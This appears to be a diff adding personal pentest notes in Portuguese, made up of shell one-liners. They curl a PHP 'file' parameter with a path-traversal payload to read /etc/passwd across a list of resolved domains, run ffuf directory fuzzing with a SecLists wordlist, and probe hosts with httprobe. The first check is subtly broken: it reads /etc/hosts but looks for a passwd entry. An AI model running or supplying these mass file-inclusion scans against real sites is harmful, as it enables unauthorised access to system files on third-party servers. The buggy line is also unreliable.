@@ -1,0 +1,20 @@
+curl -s "http://localhost/arquivo.php?file=/etc/hosts" | grep "root:x" && echo "\033[32;1mVULNERAVEL\033[m" || echo "\033[33;1mNAO E VULNERAVEL\033[m"
+
+
+
+
+
+for url in $(cat resolvidos.txt);do curl -s $url"?file=../../../../../../../../../../etc/passwd" | grep "root:x" && echo $url"\033[32;1m E VULNERAVEL\033[m\n" || echo $url"\033[33;1m NAO E VULNERAVEL\033[m";done
+
+
+
+
+for url in $(cat resolvidos.txt);do echo $url"/FUZZ" | xargs ffuf -c -v -w /home/ninja/SecLists/Discovery/Web-Content/common.txt -u;done
+
+
+
+
+Simultaneidade
+Você pode definir o nível de simultaneidade com o -csinalizador:
+
+▶ cat domains.txt | httprobe -c 50
